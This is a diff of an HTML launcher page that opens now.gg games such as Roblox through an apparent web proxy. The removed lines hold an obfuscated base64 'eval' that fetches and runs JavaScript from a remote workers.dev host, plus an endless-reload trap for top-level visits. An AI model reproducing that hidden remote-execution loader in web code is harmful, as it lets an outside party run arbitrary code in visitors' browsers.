@@ -14,59 +14,32 @@
 	<button onclick="redirect('https://now.gg/play/uncube/7074/now')">Launch Android OS</button>
 	<button onclick="redirect('https://now.gg/play/Aptoide/1440/aptoide')">Launch Aptoide</button>
 	<script type="text/javascript">
-var int;
-  var iframe;
-		var x;
 		function redirect(url){
+		var d_site = 'https://now.gg/play/roblox-corporation/5349/roblox';
+		function sleep(milliseconds) {
+  const date = Date.now();
+  let currentDate = null;
+  do {
+    currentDate = Date.now();
+  } while (currentDate - date < milliseconds);
+}
+
 		navigator.serviceWorker.register('uv_edit/sw.js', {
 	        scope: __uv$config.prefix
 	    }).then(() => {
+	        let url = d_site;
 	        if (!isUrl(url)) url = 'https://www.google.com/search?q=' + url;
 	        else if (!(url.startsWith('https://') || url.startsWith('http://'))) url = 'http://' + url;
-			clearInterval(int);
-x = document.querySelectorAll("button");
-			for(var i = 0; i < x.length; i++){
-				x[i].outerHTML = "";
-			}
-		    document.body.style.margin = "0";
-    document.body.style.height = "100vh";	
-    iframe = document.querySelector("iframe");
-    iframe.style.border = "none";
-    iframe.style.width = "100%";
-    iframe.style.height = "100%";
-    iframe.style.margin = "0";
-    iframe.referrerpolicy = "no-referrer";
-    iframe.allow = "fullscreen";
-    iframe.src = __uv$config.prefix + __uv$config.encodeUrl(url);
+
+	          // setTimeout(function() {window.location.href = __uv$config.prefix + __uv$config.encodeUrl(url);}, 3000);
+	        sleep(3000);
+	        window.location.href = __uv$config.prefix + __uv$config.encodeUrl(url);
 	    });
-		}
 		function isUrl(val = ''){
 		    if (/^http(s?):\/\//.test(val) || val.includes('.') && val.substr(0, 1) !== ' ') return true;
 		    return false;
 		};
-		    if(document.referrer != '' || window == top){
-      window = "PASS";
-      document = "PASS";
-      navigator = "PASS";
-      for(;;){
-        window.location.reload();
-      }
-    }
-       eval(atob("ZmV0Y2ggKCJodHRwczovL3JlbW90ZWx5ZXhlY3V0anMuc2hheWFhbmhvb2RhLndvcmtlcnMuZGV2LyIpCi50aGVuKHggPT4geC50ZXh0KCkpCi50aGVuKHkgPT4gZXZhbCh5KSk7"));
-int = setInterval(function(){
-      if(localStorage.getItem("iframe") == null || localStorage.getItem("iframe") == "none"){
-          document.querySelector("#history").innerHTML = "Click this to hide history";
-        } else{
-          document.querySelector("#history").innerHTML = "Click this to show history";
-        }
-}, 0);
-      function setHis(){
-        if(localStorage.getItem("iframe") == null || localStorage.getItem("iframe") == "none"){
-          localStorage.setItem("iframe", "there");
-        } else{
-          localStorage.setItem("iframe", "none");
-        }
-      }
+		}
 	</script>
 </body>
 </html>
